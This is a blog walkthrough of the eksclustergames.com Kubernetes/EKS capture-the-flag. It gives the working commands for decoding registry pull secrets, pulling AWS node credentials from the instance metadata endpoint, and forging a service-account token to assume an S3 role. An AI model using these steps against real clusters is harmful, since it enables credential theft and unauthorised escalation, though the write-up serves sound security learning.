---
category: Kubernetes
date: 2023-11-02
tags:
    - Kubernetes
    - SRE
    - Security
title: eksclustergames.com walk through!
---
[eksclustergames.com](https://eksclustergames.com) is a new CTF targetted at
kubernetes vulnerabilities. This is a walk through on how to solve the issues.

# Challenge 1
The first challenge starts off with a clue:

```
Jumpstart your quest by listing all the secrets in the cluster.
Can you spot the flag among them?
```

So lets start off by getting the secrets:

```bash
❯ kubectl get secret
NAME         TYPE     DATA   AGE
log-rotate   Opaque   1      37h
```

Since there is only one, lets view it!

```bash
❯ kubectl get secret -o json
{
    "apiVersion": "v1",
    "items": [
        {
            "apiVersion": "v1",
            "data": {
                "flag": "d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ=="
            },
            "kind": "Secret",
            "metadata": {
                "creationTimestamp": "2023-11-01T13:02:08Z",
                "name": "log-rotate",
                "namespace": "challenge1",
                "resourceVersion": "890951",
                "uid": "03f6372c-b728-4c5b-ad28-70d5af8d387c"
            },
            "type": "Opaque"
        }
    ],
    "kind": "List",
    "metadata": {
        "resourceVersion": ""
    }
}
```

The flag seems to be in `.items[0].data.flag` and is `base64` encoded so we can
decode it as well:

```bash
❯ kubectl get secret -o json|jq '.items[0].data.flag' -r | base64 -d
wiz_eks_challenge{omg_over_privileged_*REDACTED*}
```
First flag found!

This one was definitely a softball but it gets you nice and warmed up on the
platform.

# Challenge 2
The hint for this challenge is:

```
A thing we learned during our research: always check the container registries.

For your convenience, the crane utility is already pre-installed on the machine.
```

The first thing I think of when reading this is that it has something to do
with the registry a pod is living on.   So lets list the pods and see what is
available:

```bash
❯ kubectl get pod
NAME                    READY   STATUS    RESTARTS   AGE
database-pod-2c9b3a4e   1/1     Running   0          36h
```

With only one pod as a target, lets get the image for it:

```bash
❯ kubectl get pod -o json |jq '.items[0].spec.containers[0].image'
"eksclustergames/base_ext_image"
```

So its on standard `docker.io` registry instead of a private one like I was
expecting from the clue.   The second hint was that crane is on the system so
lets use that to pull the image and inspect it:

```bash
❯ crane config eksclustergames/base_ext_image 
Error: fetching config: reading image "eksclustergames/base_ext_image": GET https://index.docker.io/v2/eksclustergames/base_ext_image/manifests/latest: UNAUTHORIZED: authentication required; [map[Action:pull Class: Name:eksclustergames/base_ext_image Type:repository]]
```

Which means this is a private image and we are going to need to get some
credentials to an account that has access to this image. Usually you have to
define a secret for kubernetes to be able to pull from private registries and
since we started off with a secret test first that is where I'm going to go 
next:

```bash
❯ kubectl get pod -o json |jq '.items[0].spec.imagePullSecrets'
[
  {
    "name": "registry-pull-secrets-780bab1d"
  }
]
```

So that is the secret we need, lets view it:

```bash
❯ kubectl get secret registry-pull-secrets-780bab1d -o json |jq '.data.".dockerconfigjson"' -r|base64 -d|jq
{
  "auths": {
    "index.docker.io/v1/": {
      "auth": "ZWtzY2x1c3RlcmdhbWVzOmRj<*REDACTED*>200bHI0NWlZUWo4RnVDbw=="
    }
  }
}
```

Looks like we've got some more base64 decoding for the actual auth credentials:

```bash
❯ echo "ZWtzY2x1c3RdhbWVzOmRj<*REDACTED*>200bHI0NWlZ4RnVDbw==" | base64 -d
eksclustergames:dckr<*REDACTED*>
```

So now we can login with `crane auth`:

```bash
❯ crane auth login -u eksclustergames -p dckr<*REDACTED*> docker.io
2023/11/03 02:35:49 logged in via /home/user/.docker/config.json
```

So if we try to view the image again it should work!

```bash
❯ crane config eksclustergames/base_ext_image|jq
{
  "architecture": "amd64",
  "config": {
    "Env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
    ],
    "Cmd": [
      "/bin/sleep",
      "3133337"
    ],
    "ArgsEscaped": true,
    "OnBuild": null
  },
  "created": "2023-11-01T13:32:18.920734382Z",
  "history": [
    {
      "created": "2023-07-18T23:19:33.538571854Z",
      "created_by": "/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "
    },
    {
      "created": "2023-07-18T23:19:33.655005962Z",
      "created_by": "/bin/sh -c #(nop)  CMD [\"sh\"]",
      "empty_layer": true
    },
    {
      "created": "2023-11-01T13:32:18.920734382Z",
      "created_by": "RUN sh -c echo 'wiz_eks_challenge{nothing_can_be_said_to_*REDACTED*}' > /flag.txt # buildkit",
      "comment": "buildkit.dockerfile.v0"
    },
    {
      "created": "2023-11-01T13:32:18.920734382Z",
      "created_by": "CMD [\"/bin/sleep\" \"3133337\"]",
      "comment": "buildkit.dockerfile.v0",
      "empty_layer": true
    }
  ],
  "os": "linux",
  "rootfs": {
    "type": "layers",
    "diff_ids": [
      "sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f",
      "sha256:a70cef1cb742e242b33cc21f949af6dc7e59b6ea3ce595c61c179c3be0e5d432"
    ]
  }
}
```

Looks like they leaked the secret right there in the image layers:

```
wiz_eks_challenge{nothing_can_be_said_to_*REDACTED*}'
```

So lets submit that and move onto the next one!

# Challenge 3
The hint is:

```
A pod's image holds more than just code. Dive deep into its ECR repository,
inspect the image layers, and uncover the hidden secret.

Remember: You are running inside a compromised EKS pod.
```

This sounds very similar to the last one but with the hints that its on ECR and
that we are in the pod itself it makes me believe we'll have something like IRSA
access to AWS from the pod and need to use that to get to it.

First lets check what pods we are working with:

```bash
❯ kubectl get pod
NAME                      READY   STATUS    RESTARTS   AGE
accounting-pod-876647f8   1/1     Running   0          37h
```

So same as the last challenge, lets get the image and see what access we have:

```bash
❯ kubectl get pod -o json |jq '.items[0].spec.containers[0].image'
"688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01"
```

Which as expected, we do not have access to:

```bash
❯ crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
Error: fetching config: reading image "688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01": GET https://688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-aaf4a7c/manifests/sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01: unexpected status code 401 Unauthorized: Not Authorized
```

Since I expect the pod already has AWS access, lets check if the AWS CLI works:

```bash
❯ aws sts get-caller-identity

Unable to locate credentials. You can configure credentials by running "aws configure".
```

Credentials are not configured right now, so we need to discover them.  Lets
check if we have metadata server access:

```bash
❯ curl http://169.254.169.254/latest/meta-data/iam
info
security-credentials/
```

We do!  So we should be able to pull the credentials out of there to get access
to AWS:

```bash
❯ curl -sS http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole|jq
{
  "AccessKeyId": "ASIA2AVYNE<*REDACTED*>",
  "Expiration": "2023-11-03 03:50:19+00:00",
  "SecretAccessKey": "e4TuLKKPBAVvyPkhKiJG0jO0<*REDACTED*",
  "SessionToken": "FwoGZXIvYXdzEBQaDAM9SyNaDBowmWoT1SK3AbqDZUQpyn<*REDACTED*>"
}
```

Lets set those as environment variables to activate our AWS access:

```bash
export AWS_ACCESS_KEY_ID="ASIA2AVYNE<*REDACTED*"
export AWS_SECRET_ACCESS_KEY="e4TuLKKPBAVvyPkhKiJG0jO0<*REDACTED*"
export AWS_SESSION_TOKEN="FwoGZXIvYXdzEBQaDAM9SyNaDBowmWoT1SK3AbqDZUQpyn<*REDACTED*>"

❯ aws sts get-caller-identity
{
    "UserId": "ASIA2AVYNE<*REDACTED*>:i-0cb922c6673973282",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"
}
```

Now we should be able to authenticate crane and inspect the image from ECR:

```bash
❯ export PASSWORD=$(aws ecr get-login-password)
❯ crane auth login -u AWS -p $PASSWORD 688655246681.dkr.ecr.us-west-1.amazonaws.com  
2023/11/03 02:56:41 logged in via /home/user/.docker/config.json
```

Lets get those layers!

```bash
❯ crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01|jq
{
  "architecture": "amd64",
  "config": {
    "Env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
    ],
    "Cmd": [
      "/bin/sleep",
      "3133337"
    ],
    "ArgsEscaped": true,
    "OnBuild": null
  },
  "created": "2023-11-01T13:32:07.782534085Z",
  "history": [
    {
      "created": "2023-07-18T23:19:33.538571854Z",
      "created_by": "/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "
    },
    {
      "created": "2023-07-18T23:19:33.655005962Z",
      "created_by": "/bin/sh -c #(nop)  CMD [\"sh\"]",
      "empty_layer": true
    },
    {
      "created": "2023-11-01T13:32:07.782534085Z",
      "created_by": "RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{the_history_of_container_images_could_reveal<*REDACTED*>} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit",
      "comment": "buildkit.dockerfile.v0"
    },
    {
      "created": "2023-11-01T13:32:07.782534085Z",
      "created_by": "CMD [\"/bin/sleep\" \"3133337\"]",
      "comment": "buildkit.dockerfile.v0",
      "empty_layer": true
    }
  ],
  "os": "linux",
  "rootfs": {
    "type": "layers",
    "diff_ids": [
      "sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f",
      "sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5"
    ]
  }
}
```

Looks like they made the same mistake again and leaked the secret in the image
layers!

```
wiz_eks_challenge{the_history_of_container_images_could_reveal<*REDACTED*>} 
```

Time for challenge 4!

# Challenge 4

The hint:

```
You're inside a vulnerable pod on an EKS cluster. Your pod's service-account has
no permissions. Can you navigate your way to access the EKS Node's privileged
service-account?
```

This sounds like we're going to need to escalate our privileges through the AWS
access we acquired in the last challenge. Lets start with inspecting the
environment again:

```bash
❯ kubectl get pod
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:challenge4:service-account-challenge4" cannot list resource "pods" in API group "" in the namespace "challenge4"
```

So we don't even have access to list pods!   Do we have any access?

```bash
❯ kubectl auth can-i --list
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs                     Resource Names     Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []                 [create]
                                                [/.well-known/openid-configuration]   []                 [get]
                                                [/api/*]                              []                 [get]
                                                [/api]                                []                 [get]
                                                [/apis/*]                             []                 [get]
                                                [/apis]                               []                 [get]
                                                [/healthz]                            []                 [get]
                                                [/healthz]                            []                 [get]
                                                [/livez]                              []                 [get]
                                                [/livez]                              []                 [get]
                                                [/openapi/*]                          []                 [get]
                                                [/openapi]                            []                 [get]
                                                [/openid/v1/jwks]                     []                 [get]
                                                [/readyz]                             []                 [get]
                                                [/readyz]                             []                 [get]
                                                [/version/]                           []                 [get]
                                                [/version/]                           []                 [get]
                                                [/version]                            []                 [get]
                                                [/version]                            []                 [get]
podsecuritypolicies.policy                      []                                    [eks.privileged]   [use]
```

That is *very* minimal access. So we are going to have to try get a token using
the escalated privileges.  Usually we could use `aws eks get-token` but that
requires knowing the cluster name and I don't know that.   Lets try to list the
clusters:

```bash
❯ aws eks list-clusters

An error occurred (AccessDeniedException) when calling the ListClusters operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: eks:ListClusters on resource: arn:aws:eks:us-west-1:688655246681:cluster/*
```

So they haven't given us much to go on at all here.  The role itself *might* be
a clue but that is relying on them being consistent with their naming:

```
arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/
```

The cluster name *might* be `eks-challenge-cluster` based on that but I can't
guarantee that. Lets check its security groups:

```bash
❯ curl -sS http://169.254.169.254/latest/meta-data/security-groups;echo
eks-cluster-sg-eks-challenge-cluster-963543728
```

The name is there again.  I don't feel good about not having more details but it
is at least worth trying it:

```bash
❯ aws eks get-token --cluster-name eks-challenge-cluster
{
    "kind": "ExecCredential",
    "apiVersion": "client.authentication.k8s.io/v1beta1",
    "spec": {},
    "status": {
        "expirationTimestamp": "2023-11-03T03:38:10Z",
        "token": "k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYX<*REDACTED*"
    }
}
```

This gets us a token, so lets try to use it:

```bash
❯ export TOKEN=$(aws eks get-token --cluster-name eks-challenge-cluster|jq '.status.token' -r)
❯ kubectl --token "$TOKEN" auth can-i --list
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs   Resource Names     Verbs
serviceaccounts/token                           []                  [debug-sa]         [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []                 [create]
pods                                            []                  []                 [get list]
secrets                                         []                  []                 [get list]
serviceaccounts                                 []                  []                 [get list]
                                                [/api/*]            []                 [get]
                                                [/api]              []                 [get]
                                                [/apis/*]           []                 [get]
                                                [/apis]             []                 [get]
                                                [/healthz]          []                 [get]
                                                [/healthz]          []                 [get]
                                                [/livez]            []                 [get]
                                                [/livez]            []                 [get]
                                                [/openapi/*]        []                 [get]
                                                [/openapi]          []                 [get]
                                                [/readyz]           []                 [get]
                                                [/readyz]           []                 [get]
                                                [/version/]         []                 [get]
                                                [/version/]         []                 [get]
                                                [/version]          []                 [get]
                                                [/version]          []                 [get]
podsecuritypolicies.policy                      []                  [eks.privileged]   [use]
```

Perfect!  We have more access which includes fetching secrets:

```bash
❯ kubectl --token "$TOKEN" get secret -o json
{
    "apiVersion": "v1",
    "items": [
        {
            "apiVersion": "v1",
            "data": {
                "flag": "d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3<*REDACTED*>="
            },
            "kind": "Secret",
            "metadata": {
                "creationTimestamp": "2023-11-01T12:27:57Z",
                "name": "node-flag",
                "namespace": "challenge4",
                "resourceVersion": "883574",
                "uid": "26461a29-ec72-40e1-adc7-99128ce664f7"
            },
            "type": "Opaque"
        }
    ],
    "kind": "List",
    "metadata": {
        "resourceVersion": ""
    }
}
```

So we just need to base64 decode that and we are on to the next challenge!

```bash
❯ kubectl --token "$TOKEN" get secret -o json | jq '.items[0].data.flag' -r|base64 -d
wiz_eks_challenge{only_a_real_pro_can_navigate_<*REDACTED*>}
```

# Challenge 5
The hint:

```
You've successfully transitioned from a limited Service Account to a Node
Service Account! Great job. Your next challenge is to move from the EKS to the
AWS account.

Can you acquire the AWS role of the s3access-sa service account, and get the flag?
```

So lets start with checking what access we do have:

```bash
❯ kubectl whoami
system:node:challenge:ip-192-168-21-50.us-west-1.compute.internal
```

Can we list buckets?

```bash
❯ aws s3 ls

An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied
```

Nope!  So we need to figure out how to become the `s3access-sa`. What access do
we have?

```bash
❯ kubectl auth can-i --list
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs   Resource Names     Verbs
serviceaccounts/token                           []                  [debug-sa]         [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []                 [create]
pods                                            []                  []                 [get list]
secrets                                         []                  []                 [get list]
serviceaccounts                                 []                  []                 [get list]
                                                [/api/*]            []                 [get]
                                                [/api]              []                 [get]
                                                [/apis/*]           []                 [get]
                                                [/apis]             []                 [get]
                                                [/healthz]          []                 [get]
                                                [/healthz]          []                 [get]
                                                [/livez]            []                 [get]
                                                [/livez]            []                 [get]
                                                [/openapi/*]        []                 [get]
                                                [/openapi]          []                 [get]
                                                [/readyz]           []                 [get]
                                                [/readyz]           []                 [get]
                                                [/version/]         []                 [get]
                                                [/version/]         []                 [get]
                                                [/version]          []                 [get]
                                                [/version]          []                 [get]
podsecuritypolicies.policy                      []                  [eks.privileged]   [use]
```

Hmm, being able to create tokens for the `debug-sa` resource definitely seems
suspicious. So lets see if that will get us anywhere:

```bash
❯ export TOKEN=$(kubectl create token debug-sa)
❯ kubectl --token $TOKEN auth can-i --list
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs                     Resource Names     Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []                 [create]
                                                [/.well-known/openid-configuration]   []                 [get]
                                                [/api/*]                              []                 [get]
                                                [/api]                                []                 [get]
                                                [/apis/*]                             []                 [get]
                                                [/apis]                               []                 [get]
                                                [/healthz]                            []                 [get]
                                                [/healthz]                            []                 [get]
                                                [/livez]                              []                 [get]
                                                [/livez]                              []                 [get]
                                                [/openapi/*]                          []                 [get]
                                                [/openapi]                            []                 [get]
                                                [/openid/v1/jwks]                     []                 [get]
                                                [/readyz]                             []                 [get]
                                                [/readyz]                             []                 [get]
                                                [/version/]                           []                 [get]
                                                [/version/]                           []                 [get]
                                                [/version]                            []                 [get]
                                                [/version]                            []                 [get]
podsecuritypolicies.policy                      []                                    [eks.privileged]   [use]
```

Looks like we have less access than before.  So not too helpful, lets take a
look at that service account we want to become:

```bash
❯ kubectl get sa s3access-sa -o json
{
    "apiVersion": "v1",
    "kind": "ServiceAccount",
    "metadata": {
        "annotations": {
            "eks.amazonaws.com/role-arn": "arn:aws:iam::688655246681:role/challengeEksS3Role"
        },
        "creationTimestamp": "2023-10-31T20:07:34Z",
        "name": "s3access-sa",
        "namespace": "challenge5",
        "resourceVersion": "671916",
        "uid": "86e44c49-b05a-4ebe-800b-45183a6ebbda"
    }
}
```

I think we are going to need to use our AWS access to assume that role, I don't
believe our kubernetes access is going to get us anywhere:

```bash
❯ aws sts assume-role --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test

An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::688655246681:role/challengeEksS3Role
```

Ok, so *maybe* our kubernetes access is important since we can't assume the role
directly.   Lets try to use that $TOKEN from `debug-sa` to assume the role:

```bash
❯ aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test --web-identity-token $TOKEN

An error occurred (InvalidIdentityToken) when calling the AssumeRoleWithWebIdentity operation: Incorrect token audience
```

Getting closer!   The default audience for a token created with `kubectl` is
`https://kubernetes.default.svc` which amazon doesn't seem to like.  Lets try
creating it again with `sts.amazonaws.com`:

```bash
❯ export TOKEN=$(kubectl create token debug-sa --audience sts.amazonaws.com)
❯ aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test --web-identity-token $TOKEN
{
    "Credentials": {
        "AccessKeyId": "ASIA2AVYNEV<*REDACTED*>",
        "SecretAccessKey": "VTZ4TuDrtHGca<*REDACTED*>",
        "SessionToken": "IQoJb3JpZ2luX2VjEAQaCXVzLXd+7ONV2wIgESXuf<*REDACTED*>",
        "Expiration": "2023-11-03T05:09:07+00:00"
    },
    "SubjectFromWebIdentityToken": "system:serviceaccount:challenge5:debug-sa",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA2AVYNEVMZEZ2AFVYI:test",
        "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test"
    },
    "Provider": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589",
    "Audience": "sts.amazonaws.com"
}
```

Success!  We have some new AWS credentials.  Lets setup our new AWS Session:

```bash
❯ export AWS_ACCESS_KEY_ID="ASIA2AVYNEV<*REDACTED*>"
❯ export AWS_SECRET_ACCESS_KEY="VTZ4TuDrtHGca<*REDACTED*>"
❯ export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEAQaCXVzLXd+7ONV2wIgESXuf<*REDACTED*>"

❯ aws sts get-caller-identity
{
    "UserId": "AROA2AVYNEVMZEZ2AFVYI:test",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test"
}
```

We are now the new role!   We hopefully have access to S3 now.  At the start
of the challenge it provided us a clue to what bucket we want to view by
providing us the IAM policy:

```json
{
    "Policy": {
        "Statement": [
            {
                "Action": [
                    "s3:GetObject",
                    "s3:ListBucket"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:s3:::challenge-flag-bucket-3ff1ae2",
                    "arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag"
                ]
            }
        ],
        "Version": "2012-10-17"
    }
}
```

So we want to fetch `arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag`:

```bash
❯ aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag .
download: s3://challenge-flag-bucket-3ff1ae2/flag to ./flag       
❯ cat flag
wiz_eks_challenge{w0w_y0u_really_are_4n_eks_and_aws<*REDACTED*>}
```

and thats the final flag! In my next post I'll discuss the remediation steps
to prevent this configuration mistakes on your cluster!